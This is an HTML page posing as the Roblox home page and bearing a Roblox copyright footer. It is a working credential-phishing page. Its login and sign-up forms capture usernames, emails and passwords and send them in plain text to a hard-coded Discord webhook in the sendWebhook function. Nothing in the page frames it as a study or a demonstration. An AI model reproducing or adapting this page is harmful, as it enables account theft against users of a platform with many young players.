<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Website - Home</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    /* CSS styles */

    /* ... (existing styles) ... */

    .header {
      display: flex;
      justify-content: space-between;
    }

    .header a {
      color: #fff;
      text-decoration: none;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      width: 300px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
      display: none;
    }

    .popup.show {
      display: block;
    }

    .popup h2 {
      margin-top: 0;
    }

    .popup label,
    .popup input[type="text"],
    .popup input[type="password"],
    .popup button {
      display: block;
      margin-bottom: 10px;
    }

    .popup button {
      padding: 8px 12px;
    }
  </style>
  <script>
    function openLoginPopup() {
      document.getElementById("loginPopup").classList.add("show");
    }

    function openSignupPopup() {
      document.getElementById("signupPopup").classList.add("show");
    }

    function closePopup() {
      document.getElementById("loginPopup").classList.remove("show");
      document.getElementById("signupPopup").classList.remove("show");
    }

    function sendWebhook(event, content) {
      event.preventDefault();
      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content })
      })
        .then(response => {
          if (response.ok) {
            alert("Notification sent successfully!");
            closePopup();
          } else {
            alert("Failed to send notification.");
          }
        })
        .catch(error => {
          console.error("Error:", error);
          alert("An error occurred while sending the notification.");
        });
    }

    function login(event) {
      event.preventDefault();
      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
      sendWebhook(event, content);
    }

    function signup(event) {
      event.preventDefault();
      const username = document.getElementById("signupUsername").value;
      const email = document.getElementById("signupEmail").value;
      const password = document.getElementById("signupPassword").value;

      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
      sendWebhook(event, content);
    }
  </script>
</head>

<body>
  <div class="header">
    <a href="#" onclick="openLoginPopup()">Login</a>
    <a href="#" onclick="openSignupPopup()">Sign Up</a>
  </div>

  <div class="container">
    <div class="main-content">
      <h1>Welcome to Roblox</h1>
      <p>Explore, play, and create with millions of players.</p>
    </div>
  </div>

  <div id="loginPopup" class="popup">
    <h2>Login</h2>
    <form onsubmit="login(event)">
      <label for="loginUsername">Username:</label>
      <input type="text" id="loginUsername" required>
      <label for="loginPassword">Password:</label>
      <input type="password" id="loginPassword" required>
      <button type="submit">Login</button>
      <button type="button" onclick="closePopup()">Close</button>
    </form>
  </div>

  <div id="signupPopup" class="popup">
    <h2>Sign Up</h2>
    <form onsubmit="signup(event)">
      <label for="signupUsername">Username:</label>
      <input type="text" id="signupUsername" required>
      <label for="signupEmail">Email:</label>
      <input type="email" id="signupEmail" required>
      <label for="signupPassword">Password:</label>
      <input type="password" id="signupPassword" required>
      <button type="submit">Sign Up</button>
      <button type="button" onclick="closePopup()">Close</button>
    </form>
  </div>

  <div class="footer">
    <p>&copy; 2023 Roblox Corporation. All rights reserved.</p>
  </div>

</body>

</html>
